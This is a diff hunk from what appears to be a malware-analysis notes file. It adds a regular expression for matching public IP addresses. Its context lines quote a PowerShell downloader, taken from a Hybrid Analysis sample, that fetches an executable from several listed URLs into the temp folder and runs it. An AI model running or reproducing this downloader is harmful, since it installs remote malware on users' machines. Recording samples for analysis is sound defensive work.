@@ -35,3 +35,9 @@ Start : https://www.hybrid-analysis.com/sample/9a43186e72bde764614b092b55d4dfba0
 ```javascript
 powershell $BYi='rfd';$iQF='http://mahimamedia.com/YxdW87t@http://mandujano.net/NWJ6@http://www.creativeagency.biz/Sa0BVm@http://www.brgsabz.com/sq@http://biogas-bulgaria.efarmbg.com/fiDaiHg'.Split('@');$RdW=([System.IO.Path]::GetTempPath()+'\zUw.exe');$uIY =New-Object -com 'msxml2.xmlhttp';$svp = New-Object -com 'adodb.stream';foreach($PXv in $iQF){try{$uIY.open('GET',$PXv,0);$uIY.send();If ($uIY.Status -eq 200) {$svp.open();$svp.type = 1;$svp.write($uIY.responseBody);$svp.savetofile($RdW);Start-Process $RdW;break}}catch{}}      
 ```
+
+
+# Note(Regx):
+
+1. Public Ip 
++ ^([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])(?<!172\.(16|17|18|19|20|21|22|23|24|25|26|27|28|29|30|31))(?<!127)(?<!^10)(?<!^0)\.([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])(?<!192\.168)(?<!172\.(16|17|18|19|20|21|22|23|24|25|26|27|28|29|30|31))\.([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])(?<!\.255$)$
